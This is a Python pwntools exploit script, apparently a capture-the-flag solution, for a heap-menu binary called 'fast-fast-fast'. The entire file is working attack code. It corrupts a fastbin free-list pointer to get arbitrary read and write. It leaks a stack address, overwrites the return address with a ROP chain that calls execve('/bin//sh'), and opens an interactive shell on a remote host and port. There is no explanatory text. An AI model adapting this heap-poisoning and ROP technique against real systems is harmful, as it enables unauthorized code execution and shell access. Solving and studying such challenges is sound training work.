#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys
from struct import *

# switches
DEBUG = 0 

# modify this
elf = ELF('./fast-fast-fast')

if DEBUG:
    io = process('./fast-fast-fast')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def create_fast(secret):
    ru('3 : saysecret\n')
    sl('1')
    ru('3 : delet\n')
    sl('1')
    ru('please input your secret')
    sl(secret)

def del_fast():
    ru('3 : saysecret\n')
    sl('1')
    ru('3 : delet\n')
    sl('3')

def create_small(secret):
    ru('3 : saysecret\n')
    sl('2')
    ru('3 : delet\n')
    sl('1')
    ru('please input your secret')
    sl(secret)

def del_small():
    ru('3 : saysecret\n')
    sl('2')
    ru('3 : delet\n')
    sl('3')

def say():
    ru('3 : saysecret\n')
    sl('3')

def edit_small(secret):
    ru('3 : saysecret\n')
    sl('2')
    ru('3 : delet\n')
    sl('2')
    ru('please input your secrert')
    sl(secret)

def edit_fast(secret):
    ru('3 : saysecret\n')
    sl('1')
    ru('3 : delet\n')
    sl('2')
    ru('please input your secrert')
    sl(secret)

def write_it(addr, content):
    edit_fast(p64(1) + p64(0x2f0) + p64(addr))
    edit_small(content)

def read_it(addr):
    edit_fast(p64(1) + p64(0xf0f0) + p64(addr))
    ru('3 : saysecret\n')
    sl('2')
    ru('3 : delet\n')
    sl('3')
    return ru('choose')[:-6]
   

# define exploit function here
def pwn():
    create_fast('123')
    del_fast()
    create_small('456')
    del_fast() #actually delete small chunk
    create_fast('789')
    del_fast() #delete fastbin
    edit_small(p64(0x6c4aa0)) #edit fastbin's fd
    say()#malloc 0x60
    create_fast(p64(0x6c4a80))#another in got
    write_it(0x00000000006C3750,p64(0x00000000004082A0))
    stack_addr = u64(read_it(0x6c3888).ljust(8, '\x00'))
    info('stack_addr :' + hex(stack_addr)) #read stack addr
    pause()
    
    ret_addr = stack_addr - 0x130
    p = ''

    p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c1060) # @ .data
    p += pack('<Q', 0x000000000044d8e4) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x00000000004714a1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c1068) # @ .data + 8
    p += pack('<Q', 0x000000000041c3cf) # xor rax, rax ; ret
    p += pack('<Q', 0x00000000004714a1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000401a83) # pop rdi ; ret
    p += pack('<Q', 0x00000000006c1060) # @ .data
    p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c1068) # @ .data + 8
    p += pack('<Q', 0x0000000000437835) # pop rdx ; ret
    p += pack('<Q', 0x00000000006c1068) # @ .data + 8
    p += pack('<Q', 0x000000000041c3cf) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000400488) # syscall
    print len(p)

    write_it(ret_addr, p) #edit ret as shellcode 
    io.interactive()
    return

if __name__ == '__main__':
    pwn()
    
